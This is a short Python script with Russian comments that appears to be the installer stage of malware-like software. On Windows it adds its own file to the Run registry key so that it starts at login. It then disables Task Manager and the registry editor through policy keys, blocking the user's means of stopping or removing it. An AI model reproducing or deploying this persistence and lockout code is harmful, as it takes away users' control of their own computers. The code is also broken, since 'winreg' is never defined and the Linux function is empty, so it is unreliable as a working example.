import winreg as reg
import os
from sys import platform
from winreg import *

# Функция для установки на видовс, которая закидывает файл в реестр автозагрузок, блокирует доступ в реестр
def win32():
    # Кидаем в автозагрузки
    pth = os.path.dirname(os.path.realpath(__file__)) #--
    p_name = "test_autorun.py"                        # Узнаем, где лежит файл, что указать до него путь
    address = os.path.join(pth, p_name)               #--
    tmp = reg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValue(tmp, None, reg.REG_SZ, address)
    winreg.CloseKey(tmp)
    
    # Создаем sub_key System, т.к. обычно ее нет (на этом этапе нужны права администратора...)
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\\System")
    
    # Блокируем доступ в диспетчер задач
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)
    CloseKey(key)
    
    # Закрываем встроенный редактор реестра
    keyVal = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    except:
        key = CreateKey(HKEY_CURRENT_USER, keyVal)
    SetValueEx(key, "DisableRegistryTools", 0, REG_DWORD, 1)
    CloseKey(key)
    
def linux():
    # Coming soon........
   
# Выбор метода установки взависимости от ОС и установка
if platform == "linux" or platform == "linux2":
    linux()
elif platform == "win32":
    win32()
